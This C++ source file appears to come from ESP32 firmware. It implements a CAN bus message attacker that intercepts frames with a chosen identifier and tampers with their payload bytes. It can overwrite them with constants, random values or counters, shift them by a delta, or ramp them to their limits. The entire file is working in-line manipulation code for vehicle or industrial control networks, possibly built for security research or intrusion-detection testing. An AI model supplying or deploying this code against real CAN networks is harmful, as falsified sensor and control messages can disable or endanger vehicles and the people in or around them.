#include "MessageAttacker.h"

#include <stdint.h>
#include <algorithm>

#include "driver/can.h"
#include "esp_log.h"
#include "esp_system.h"

#include "AttackConfig.h"
#include "AttackType.h"
#include "defines.h"

AttackType MessageAttacker::attackType;
uint32_t MessageAttacker::idToBeAttacked;
uint8_t MessageAttacker::constValue;
uint8_t MessageAttacker::deltaValue;
uint8_t MessageAttacker::upperLimiterValue;
uint8_t MessageAttacker::lowerLimiterValue;
uint8_t MessageAttacker::counter;
int MessageAttacker::offset;
int MessageAttacker::attackLength;

MessageAttacker::MessageAttacker(AttackConfig* attackConfig) {
    this->attackConfig = attackConfig;
    updateAttackConfig();
}

void MessageAttacker::updateAttackConfig(){
    MessageAttacker::attackType = this->attackConfig->getAttackType();
    MessageAttacker::idToBeAttacked = this->attackConfig->getIDToBeAttacked();
    MessageAttacker::offset = this->attackConfig->getOffset();
    MessageAttacker::attackLength = this->attackConfig->getAttackLength();
    MessageAttacker::constValue = this->attackConfig->getConstValue();
    MessageAttacker::deltaValue = this->attackConfig->getDeltaValue();
    MessageAttacker::upperLimiterValue = 255;
    MessageAttacker::lowerLimiterValue = 0;

    if (MessageAttacker::attackType == AttackType::REPLACE_DATA_WITH_INCREASING_COUNTER) {
        MessageAttacker::counter = 0;
    } else {
        MessageAttacker::counter = 255;
    }
}

bool MessageAttacker::attackMessage(can_message_t* canMessage) {
    if (MessageAttacker::attackType == AttackType::PASSTHROUGH) {
        ESP_LOGD(MESSAGE_ATTACKER_LOG_TAG, "Passthrough mode");
        return true;
    } else if (canMessage->identifier == MessageAttacker::idToBeAttacked) {
        ESP_LOGD(MESSAGE_ATTACKER_LOG_TAG, "Message ID matches, attacking!");
        switch (attackType) {  // refactoring the code so that the switch is inside the for cycle would be "better looking", but this way it's faster, because
                               // we only branch at the switch one time
            case AttackType::REPLACE_DATA_WITH_CONSTANT_VALUES:
                for (int i = MessageAttacker::offset; i < MessageAttacker::offset + MessageAttacker::attackLength; i++) {
                    ESP_LOGD(MESSAGE_ATTACKER_LOG_TAG, "Replaced data!");
                    canMessage->data[i] = MessageAttacker::constValue;
                }
                break;

            case AttackType::REPLACE_DATA_WITH_RANDOM_VALUES:
                for (int i = MessageAttacker::offset; i < MessageAttacker::offset + MessageAttacker::attackLength; i++) {
                    canMessage->data[i] = (uint8_t)esp_random(); 
                }
                break;

            case AttackType::ADD_DELTA_VALUE_TO_THE_DATA:
                for (int i = MessageAttacker::offset; i < MessageAttacker::offset + MessageAttacker::attackLength; i++) {
                    uint8_t newValue = canMessage->data[i] + MessageAttacker::deltaValue;

                    if (newValue < canMessage->data[i]) {  // We had an overflow, we cap it off at the max value
                        newValue = 255;
                    }

                    canMessage->data[i] = newValue;
                }
                break;

            case AttackType::SUBTRACT_DELTA_VALUE_FROM_THE_DATA:
                for (int i = MessageAttacker::offset; i < MessageAttacker::offset + MessageAttacker::attackLength; i++) {
                    uint8_t newValue = canMessage->data[i] - MessageAttacker::deltaValue;

                    if (newValue > canMessage->data[i]) {  // We had an underflow, we set it to the min value
                        newValue = 0;
                    }

                    canMessage->data[i] = newValue;
                }
                break;

            case AttackType::INCREASE_DATA_UNTIL_MAX_VALUE:
                if (MessageAttacker::lowerLimiterValue == 0) {  // set initial lowest value from the affected bytes
                    uint8_t minValue = 255;

                    for (int i = MessageAttacker::offset; i < MessageAttacker::offset + MessageAttacker::attackLength; i++) {
                        minValue = std::min(canMessage->data[i], minValue);
                    }

                    MessageAttacker::lowerLimiterValue = minValue;
                }

                for (int i = MessageAttacker::offset; i < MessageAttacker::offset + MessageAttacker::attackLength; i++) { //if the lowerLimit is higher than the current value, let's set the value to the limit
                    canMessage->data[i] = std::max(canMessage->data[i], MessageAttacker::lowerLimiterValue);
                }

                if (MessageAttacker::lowerLimiterValue < 255) { //increase until max value
                    MessageAttacker::lowerLimiterValue++;
                }
                break;

            case AttackType::DECREASE_DATA_UNTIL_MIN_VALUE:
                if (MessageAttacker::upperLimiterValue == 255) {  // set initial highest value from the affected bytes
                    uint8_t maxValue = 0;

                    for (int i = MessageAttacker::offset; i < MessageAttacker::offset + MessageAttacker::attackLength; i++) {
                        maxValue = std::max(canMessage->data[i], maxValue);
                    }

                    MessageAttacker::upperLimiterValue = maxValue;
                }

                for (int i = MessageAttacker::offset; i < MessageAttacker::offset + MessageAttacker::attackLength; i++) { //if the upperLimit is lower than the current value, let's set the value to the limit
                    canMessage->data[i] = std::min(canMessage->data[i], MessageAttacker::upperLimiterValue);
                }

                if (MessageAttacker::upperLimiterValue > 0) { //decrease until min value
                    MessageAttacker::upperLimiterValue--;
                }
                break;

            case AttackType::REPLACE_DATA_WITH_INCREASING_COUNTER: 
                for (int i = MessageAttacker::offset; i < MessageAttacker::offset + MessageAttacker::attackLength; i++) {
                    canMessage->data[i] = MessageAttacker::counter;
                }

                MessageAttacker::counter++;
                break;

            case AttackType::REPLACE_DATA_WITH_DECREASING_COUNTER:
                for (int i = MessageAttacker::offset; i < MessageAttacker::offset + MessageAttacker::attackLength; i++) {
                    canMessage->data[i] = MessageAttacker::counter;
                }

                MessageAttacker::counter--;
                break;

            default:
                ESP_LOGE(MESSAGE_ATTACKER_LOG_TAG, "Unknown attack type!");
                return false;
                }
        return true;

    } else {
        ESP_LOGD(MESSAGE_ATTACKER_LOG_TAG, "Message ID differs, no attack");
        return true;
    }
}